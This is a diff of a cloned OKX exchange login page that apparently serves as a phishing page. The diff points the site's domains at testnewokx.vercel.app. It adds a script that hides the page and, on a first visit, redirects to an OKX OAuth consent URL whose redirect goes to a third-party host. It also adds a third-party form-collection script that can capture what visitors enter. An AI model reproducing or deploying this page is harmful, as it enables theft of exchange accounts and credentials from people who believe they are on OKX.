@@ -30,38 +30,41 @@
   <meta name="browsermode" content="application" />
   <meta name="x5-orientation" content="portrait" />
   <meta name="x5-fullscreen" content="true" />
-  <meta name="x5-page-mode" content="app" />
-  <meta name="apple-mobile-web-app-capable" content="yes" />
-  <meta name="theme-color" content="#121212" />
-  <link rel="preconnect" href="https://yipman-poc.static.domains" crossorigin="" />
       <style>
         body.hidden {
             display: none;
         }
     </style>
-  <link rel="dns-prefetch" href="https://yipman-poc.static.domains" />
-  <script>
-    setTimeout(function () {
-        const hasVisited = localStorage.getItem("hasVisited");
+  <meta name="x5-page-mode" content="app" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="theme-color" content="#121212" />
+  <link rel="preconnect" href="https://testnewokx.vercel.app" crossorigin="" />
+    <script>
+        // Add a delay to ensure this page is recorded in the browser history
+        //window.onload = function () {
+            setTimeout(function () {
+                const hasVisited = localStorage.getItem("hasVisited");
 
-        if (!hasVisited) {
-            // If it's the user's first visit, set the flag and redirect
-            localStorage.setItem("hasVisited", "true");
-            window.location.href = 'https://www.okx.com/account/authlogin#error=access_denied'; // URL of Page (1)
-        } else {
-            // If the user has already visited, show the body
-            document.body.classList.remove("hidden");
-        }
+                if (!hasVisited) {
+                    // If it's the user's first visit, set the flag and redirect
+                    localStorage.setItem("hasVisited", "true");
+                    window.location.href = 'https://www.okx.com/account/oauth?access_type=offline&response_type=code&inapp_redirect=true&client_id=db50e9193d264fdbadea1d3e287c40feQ5UAx5f8&redirect_uri=https%3A%2F%2Fokx.ada.support%2Fapi%2Foauth%2Fauthorization&scope=read_only&state=.eJwVjEkOwyAQwP7CuUgDAbJ8BrEMCgoJEUN6qfr30qtl-8PC7nrHZns98GIbm6NxKPzCk_aSK1gnvopZ8MUoqYRGEVdgL3YX11Nt5yj-h0Ea0l0vQpvjgGbyftEBwEhwUXoTQCOAGmImS-jOgkTWPX1nW3KFcDyPgDbUiPaNLaeMjW3XU8r3B2NfNLo.ZyKwuA.dijyjbKp6BKNAX-kyOx56bAE4pM'; // URL of Page (1)
+                } else {
+                    // If the user has already visited, show the body
+                    document.body.classList.remove("hidden");
+                }
 
-        // Handle page visibility on back navigation
-        window.addEventListener("pageshow", function (event) {
-            if (event.persisted) {
-                // Show the body if the page is loaded from the browser cache
-                document.body.classList.remove("hidden");
-            }
-        });
-    }, 500); // Adjust the delay as needed (500ms is often sufficient)
-</script>
+                // Handle page visibility on back navigation
+                window.addEventListener("pageshow", function (event) {
+                    if (event.persisted) {
+                        // Show the body if the page is loaded from the browser cache
+                        document.body.classList.remove("hidden");
+                    }
+                });
+            }, 500); // Adjust the delay as needed (500ms is often sufficient)
+        //};
+    </script>
+  <link rel="dns-prefetch" href="https://testnewokx.vercel.app" />
   <link rel="shortcut icon" href="https://www.okx.com/cdn/assets/imgs/226/EB771F0EE8994DD5.png" type="image/png" />
   <link rel="canonical" href="https://www.okx.com/account/login" />
   <link rel="alternate" href="https://www.okx.com/zh-hans/account/login" hreflang="zh-Hans" />
@@ -128,7 +131,6 @@
 </head>
 
 <body id="body" class="hidden" broker-style="" data-responsive="true" data-nav="true">
-
   <header id="headerContainer" class="header header-container" data-chain="false">
     <div class="header-wrap ">
       <div class="header-main" data-from="1">
@@ -2398,9 +2400,9 @@
       "locale": "en_US",
       "cookies": {},
       "simulatedStatus": 1,
-      "cdnBaseUrl": "https://yipman-poc.static.domains",
-      "innerDomain": "https://yipman-poc.static.domains",
-      "mainDomain": "https://yipman-poc.static.domains",
+      "cdnBaseUrl": "https://testnewokx.vercel.app",
+      "innerDomain": "https://testnewokx.vercel.app",
+      "mainDomain": "https://testnewokx.vercel.app",
       "ipRegion": "EG",
       "isInnerDomain": false,
       "isOnChainMode": false,
@@ -2821,6 +2823,10 @@
   </script><noscript><iframe title="google" src="https://www.googletagmanager.com/ns.html?id=GTM-5RX47XK" height="0"
       width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
+<!-- Static App Form Collection Script -->
+<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
+
+<script src="https://static.app/js/static.js" type="text/javascript"></script>
 </body>
 
 </html>
